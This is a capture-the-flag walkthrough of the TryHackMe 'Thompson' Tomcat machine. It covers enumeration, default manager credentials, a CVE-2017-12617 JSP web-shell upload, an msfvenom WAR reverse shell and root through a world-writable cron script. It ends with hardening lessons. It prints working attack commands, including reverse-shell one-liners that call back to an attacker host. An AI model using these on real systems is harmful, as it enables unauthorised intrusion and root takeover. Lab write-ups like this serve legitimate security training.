---
title: "Thompson"
description: "An easy Tomcat boot2root: default manager credentials lead to a WAR-deployed JSP reverse shell, and a world-writable script executed by a root cron job hands over the root flag."
difficulty: "Easy"
tags: ["Tomcat", "Default Credentials", "CVE-2017-12617", "WAR Deployment", "Reverse Shell", "Cron Job", "Privilege Escalation"]
date: "2026-04-03"
---

## Overview

Thompson is an easy boot2root machine built for FIT and the BSides Guatemala CTF. It runs an Ubuntu 16.04 server hosting Apache Tomcat 8.5.5, and the entire compromise hinges on two very ordinary mistakes: the Tomcat Manager application is still protected by its well-known default password, and a shell script executed by root every minute sits in a user's home directory with world-writable permissions.

The foothold is not a memory-corruption exploit — it is a legitimate administrative feature (WAR deployment) used with stolen-by-default credentials, which is exactly why this class of bug is so common in the real world. Once inside as the `tomcat` user, privilege escalation is a one-line file overwrite.

## Room Information

- **Platform:** TryHackMe
- **Difficulty:** Easy
- **Category:** boot2root
- **Operating System:** Ubuntu 16.04.6 LTS (Xenial)
- **Skills Learned:** Tomcat enumeration, default credential discovery, CVE-2017-12617 (PUT-based JSP upload), WAR payload deployment, reverse shell handling, cron job privilege escalation

## Enumeration

### Nmap Scan

The scan was started with service and default-script detection so the output would identify both the software and its version — the version number is what decides which exploits are even worth trying:

```bash
nmap -sV -sC -oN nmap.txt 10.48.159.174
```

```text
# Nmap 7.95 scan initiated Fri Apr  3 21:55:47 2026 as: /usr/lib/nmap/nmap -sV -sC -oN nmap.txt 10.48.159.174
Nmap scan report for 10.48.159.174
Host is up (0.16s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 fc:05:24:81:98:7e:b8:db:05:92:a6:e7:8e:b0:21:11 (RSA)
|   256 60:c8:40:ab:b0:09:84:3d:46:64:61:13:fa:bc:1f:be (ECDSA)
|_  256 b5:52:7e:9c:01:9b:98:0c:73:59:20:35:ee:23:f1:a5 (ED25519)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp open  http    Apache Tomcat 8.5.5
|_http-title: Apache Tomcat/8.5.5
|_http-favicon: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Only three ports are open, and they tell a very short story:

| Port | Service | Version | Why it matters |
|------|---------|---------|----------------|
| 22/tcp | SSH | OpenSSH 7.2p2 (Ubuntu) | Useful only once credentials or keys are found |
| 8009/tcp | ajp13 | Apache JServ Protocol v1.3 | The binary connector Tomcat uses behind a front-end proxy |
| 8080/tcp | HTTP | Apache Tomcat 8.5.5 | The actual application server, and the intended entry point |

The `ajp-methods` script line — "Failed to get a valid response for the OPTION request" — is a hint that the AJP connector is speaking its native binary protocol rather than HTTP, which is expected behaviour and not a vulnerability by itself.

### Web Enumeration — Tomcat

Browsing `http://10.48.159.174:8080/` returned the stock Apache Tomcat landing page. Tomcat's default installation ships three web applications, all of which are interesting:

```bash
gobuster dir -u http://10.48.159.174:8080/ \
  -w /usr/share/wordlists/dirb/common.txt -t 200
```

| Path | Purpose |
|------|---------|
| `/manager/html` | Web Application Manager — deploys and manages applications |
| `/host-manager/html` | Manages virtual hosts (not useful here) |
| `/docs`, `/examples` | Documentation and sample servlets |

The `/manager/html` endpoint is the critical one. The Tomcat Manager is not a read-only dashboard: it is an application deployment console, and anyone who can authenticate to it can upload a `.war` archive that Tomcat will unpack and execute as the `tomcat` service account. In other words, **authenticating to the Manager is equivalent to remote code execution**.

### Credential Discovery

Requesting `/manager/html` triggers HTTP Basic authentication. Cancelling the prompt (or deliberately submitting a wrong password) returns a 401 error page whose HTML source contains a comment naming the file that holds the accounts:

```html
<!--
NOTE: For security reasons, using the manager webapp is restricted
to users with role "manager-gui". The host-manager webapp is
restricted to users with role "admin-gui". Users are defined in:
$CATALINA_BASE/conf/tomcat-users.xml
-->
```

Because this is a CTF image, the shipped `tomcat-users.xml` was never hardened and still contained the vendor's well-known default account:

```xml
<role rolename="manager-gui"/>
<user username="tomcat" password="s3cret" roles="manager-gui"/>
```

Those same credentials can also be surfaced automatically with `nikto`, which reads the error page and reports the pair it finds:

```bash
nikto -h http://10.48.159.174:8080
```

Either way the result is the same: `tomcat:s3cret` is accepted by `/manager/html`. It is worth noting that `metasploit`'s `auxiliary/scanner/http/tomcat_mgr_login` does **not** find this pair — the room is deliberately built so that blind brute-forcing misses the credential that is sitting in plain text on an error page.

### Alternative — AJP on 8009 (Ghostcat)

Port 8009 invites a detour into CVE-2020-1938 ("Ghostcat"), an arbitrary file read/inclusion flaw in Tomcat's AJP connector. The public PoC for it can retrieve files that live inside a deployed web application, for example:

```bash
python2 48143.py -p 8009 -f /WEB-INF/web.xml 10.48.159.174
```

That succeeds, but it only returns the application's own `web.xml`. Reading `conf/tomcat-users.xml` fails with `FileNotFoundException`, because the AJP connector resolves paths relative to the application's document base and cannot escape upward into `$CATALINA_BASE/conf`. The Ghostcat path is therefore a dead end on this box, and it is documented here mainly so the attempt does not look like an oversight.

## Initial Access

Two routes lead to the same foothold. The first abuses a misconfigured default servlet; the second abuses the Manager's deployment feature. The local notes for this room recorded both, so both are covered.

### Route A — CVE-2017-12617 (PUT-based JSP upload)

Apache Tomcat 8.5.5 predates the fix for CVE-2017-12617. When the `DefaultServlet` is initialised with `readonly=false`, HTTP `PUT` is enabled for the whole web root. Tomcat will then happily write an attacker-supplied file into a deployed application directory — and if that file has a `.jsp` extension, Tomcat compiles and executes it on the next request. That is unauthenticated remote code execution.

The PoC used here (`exploit.py`, the public intx0x80 CVE-2017-12617 script) works in three stages, and reading it makes the mechanics obvious:

1. `createPayload()` sends `PUT /Poc.jsp/` with a marker string and treats HTTP `201 Created` as confirmation. The **trailing slash is the trick** — it makes Tomcat treat the path as a directory and write the body into the file named in the URL.
2. It then `GET`s `/Poc.jsp` and looks for the marker to prove the file is being served and evaluated.
3. `RCE()` overwrites the same path with a JSP web shell, and `shell()` loops over `GET /<shell>.jsp?cmd=<command>`, printing the returned output.

First, confirm the target is vulnerable:

```bash
python3 exploit.py -u http://10.48.159.174:8080
```

```text
Poc Filename  Poc.jsp
File Created ..
http://10.48.159.174:8080 it's Vulnerable to CVE-2017-12617
http://10.48.159.174:8080/Poc.jsp
```

Then upload the interactive web shell (`-p` takes the shell's base name; the script appends `.jsp`):

```bash
python3 exploit.py -u http://10.48.159.174:8080 -p pwn
```

```text
Uploading Webshell .....
$ id
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)

$ hostname
ubuntu
```

The shell is a JSP page that calls `Runtime.getRuntime().exec(cmd)` and prints the process output, so each "command" is a separate, stateless process — enough to read files and enumerate, but not a real terminal.

> **A note on reliability:** `readonly=false` is not the default. On a hardened Tomcat (or a re-deployed instance of this room) the `PUT` returns `404`/`403` and the PoC reports "Not Vulnerable". That is precisely what several public writeups of this box encountered. When that happens, the deployment route below is the intended path — and it is the route the `shell.war` artifact in this room's folder was built for.

### Route B — WAR deployment through the Manager

With `tomcat:s3cret` in hand, log in at `http://10.48.159.174:8080/manager/html`. The Manager exposes a "WAR file to deploy" form; anything uploaded there is unpacked into the webapps directory and started automatically.

Generate a JSP reverse shell packaged as a WAR. The payload has to match the target platform — Tomcat executes it inside a JVM, so a `java/jsp_shell_reverse_tcp` payload is used rather than an ELF or PE:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.253.107 LPORT=4444 -f war -o shell.war
```

Start the listener **before** deploying, because the payload connects back the moment it is triggered:

```bash
nc -lvnp 4444
```

Upload `shell.war` through the Manager form and deploy it. Tomcat creates a context named after the archive, so the payload is reachable at `/shell/`.

Inspecting the generated artifact confirms what it does — a `WEB-INF/web.xml` that names a randomly generated JSP as the welcome file, and that JSP spawns `/bin/sh` and bridges its stdin/stdout to the attacker over a socket:

```jsp
Socket socket = new Socket("192.168.253.107", 4444);
Process process = Runtime.getRuntime().exec("/bin/sh");
```

Requesting the context executes the welcome file and the shell connects back:

```bash
curl http://10.48.159.174:8080/shell/
```

```text
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.253.107] from (UNKNOWN) [10.48.159.174] 44296
id
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
```

A WAR survives a Tomcat restart and stays deployed until it is undeployed, which makes this route slightly more persistent than a single uploaded JSP.

### Shell Stabilisation

The raw shell has no job control, no tab completion and no `sudo` prompt handling. Upgrading to a proper PTY fixes all three:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl-Z to background, then locally:
stty raw -echo; fg
```

### User Flag

The `tomcat` account cannot log in interactively, but it can read files owned by other users as long as the permissions allow it. `/home/jack` is world-readable, and the flag file is `rw-rw-r--`:

```bash
cd /home/jack
ls -la
cat user.txt
```

```text
-rwxrwxrwx 1 jack jack   26 Aug 14  2019 id.sh
-rw-r--r-- 1 root root   39 Nov 20 09:39 test.txt
-rw-rw-r-- 1 jack jack   33 Aug 14  2019 user.txt
```

```text
39400c90bc683a41a8935e4719f181bf
```

That directory listing is more interesting than the flag. `id.sh` is world-writable, `test.txt` is owned by **root** and was modified minutes ago — two strong signals that root is executing something inside a directory the low-privileged user controls.

## Privilege Escalation

### Ruling Out the Obvious

Standard local enumeration returns nothing usable. `sudo -l` fails because `tomcat` is not in the sudoers file, and the SUID search only produces the distribution's stock binaries (`su`, `passwd`, `mount`, `sudo`, …), none of which are exploitable without credentials:

```bash
id
sudo -l
find / -perm -4000 -type f 2>/dev/null
```

The interesting finding had already appeared in the user flag directory, so the next step was to confirm it with the system-wide crontab:

```bash
cat /etc/crontab
```

```text
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root    cd /home/jack && bash id.sh
```

The last line is the whole vulnerability in one row. It runs **every minute**, as **root**, and it executes `id.sh` from `/home/jack` — a directory owned by the unprivileged `jack` user.

### Why the Cron Job Is Exploitable

Three conditions line up:

1. **The scheduler runs as root.** Anything the script does happens with `uid=0`.
2. **The script is world-writable** (`-rwxrwxrwx`), so `tomcat` can replace its contents without owning it or being able to `sudo`.
3. **The script lives in a user-writable directory.** Even if the file permissions were tightened, `jack` (or anyone with write access to the directory) could swap the file itself.

The original script explains the mystery of `test.txt`:

```bash
cat id.sh
```

```bash
#!/bin/bash
id > test.txt
```

And `test.txt` — owned by root, refreshed every minute — is the proof that the job is live and running with full privileges:

```bash
cat test.txt
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

### Exploiting the Writable Script

Because the crontab invokes the script as `bash id.sh` rather than executing it directly, the shebang line is not even required — the shell is chosen by the cron entry. Replacing the body with a copy command is the least disruptive way to grab the flag:

```bash
printf 'cp /root/root.txt /home/jack/root.txt\nchmod 644 /home/jack/root.txt\n' > /home/jack/id.sh
cat /home/jack/id.sh
```

Wait for the next minute boundary, then read the result:

```bash
watch -n 5 ls -la /home/jack/root.txt
cat /home/jack/root.txt
```

```text
d89d5391984c0450a95497153ae7ca3a
```

Two equally valid alternatives produce a real root shell instead of a copied file:

```bash
# Give bash the SUID bit, then run it with -p to keep privileges
echo 'chmod u+s /bin/bash' > /home/jack/id.sh
# ... wait one minute ...
/bin/bash -p

# Or have root connect back to a listener
echo 'bash -i >& /dev/tcp/192.168.253.107/5555 0>&1' > /home/jack/id.sh
```

Both work for the same reason: root is executing content that a low-privileged user can rewrite. The copy approach is preferred here only because it leaves the machine in a state that is trivial to clean up.

## Flags

| Flag | Location | Value |
|------|----------|-------|
| User | `/home/jack/user.txt` | `39400c90bc683a41a8935e4719f181bf` |
| Root | `/root/root.txt` (copied to `/home/jack/root.txt` by the cron job) | `d89d5391984c0450a95497153ae7ca3a` |

## Commands Used

```bash
# Enumeration
nmap -sV -sC -oN nmap.txt 10.48.159.174
gobuster dir -u http://10.48.159.174:8080/ -w /usr/share/wordlists/dirb/common.txt -t 200
nikto -h http://10.48.159.174:8080

# Route A - CVE-2017-12617 (PUT-based JSP upload)
python3 exploit.py -u http://10.48.159.174:8080          # vulnerability check
python3 exploit.py -u http://10.48.159.174:8080 -p pwn   # upload web shell

# Route B - WAR deployment via the Tomcat Manager (tomcat:s3cret)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.253.107 LPORT=4444 -f war -o shell.war
nc -lvnp 4444
# upload shell.war at http://10.48.159.174:8080/manager/html
curl http://10.48.159.174:8080/shell/

# Shell upgrade
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty raw -echo; fg

# User flag
cd /home/jack && ls -la && cat user.txt

# Privilege escalation
id
sudo -l
find / -perm -4000 -type f 2>/dev/null
cat /etc/crontab
cat id.sh
cat test.txt
printf 'cp /root/root.txt /home/jack/root.txt\nchmod 644 /home/jack/root.txt\n' > /home/jack/id.sh
cat /home/jack/root.txt
```

## Lessons Learned

- **Default credentials are still the most common way into a Tomcat server.** `tomcat:s3cret` has been the textbook pair for two decades, and it was accepted here. Any credential audit should include vendor defaults before brute-forcing, because brute-force tools like `tomcat_mgr_login` can miss a password that is not in the wordlist.
- **Error pages leak more than error codes.** The 401 response revealed the path to `tomcat-users.xml`, and `nikto` turned that page into a credential disclosure. Response bodies deserve the same attention as response codes.
- **The Tomcat Manager is remote code execution by design.** WAR deployment is an administrative feature, not a bug. Treating `/manager` and `/host-manager` as high-risk endpoints — restrict by source IP, disable when unused — removes an entire attack class.
- **CVE-2017-12617 is a configuration-dependent bug.** The PUT handler only writes files when the `DefaultServlet` has `readonly=false`. Version-matching an exploit is not the same as confirming it: always run the vulnerability check and read the result before building a plan around it.
- **An exposed AJP connector is not automatically exploitable.** Ghostcat can read files inside a deployed application, but it cannot traverse out of the document base into `conf/`, so `tomcat-users.xml` stayed out of reach. Knowing why an exploit fails is as valuable as knowing that it fails.
- **Version information drives the whole engagement.** `Apache Tomcat 8.5.5` in the nmap output narrowed the search space immediately, and knowing the patch level of the `DefaultServlet` decided which of the two routes was worth pursuing.
- **Cron jobs that execute user-controlled files are a direct path to root.** The `id.sh` entry failed every principle of privilege separation: root ran a world-writable script from a directory owned by a low-privileged user, and the script's own output (`test.txt`) advertised the fact. A simple `find / -writable -type f` review of anything referenced by `/etc/crontab` would have caught it during a hardening pass.
- **Small artefacts confirm large conclusions.** A file owned by root and modified within the last minute was the strongest evidence that a privileged scheduler was active — no exploitation required to prove it.

## References

- [TryHackMe — Thompson](https://tryhackme.com/room/bsidesgtthompson)
- [CVE-2017-12617 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2017-12617)
- [CVE-2020-1938 (Ghostcat) — NVD](https://nvd.nist.gov/vuln/detail/CVE-2020-1938)
- [Apache Tomcat — Security Considerations (readonly / Manager hardening)](https://tomcat.apache.org/tomcat-8.5-doc/security-howto.html)
- [Apache Tomcat 8.5 — Manager Application How-To](https://tomcat.apache.org/tomcat-8.5-doc/manager-howto.html)
- [Metasploit — java/jsp_shell_reverse_tcp payload](https://www.rapid7.com/db/modules/payload/java/jsp_shell_reverse_tcp/)
- [CatSec — TryHackMe Thompson write-up](https://github.com/catsecorg/CatSec-TryHackMe-WriteUps/blob/main/Thompson/README.md)
- [DesKel — THM write-up: Thompson](https://deskel.github.io/posts/thm/thompson)
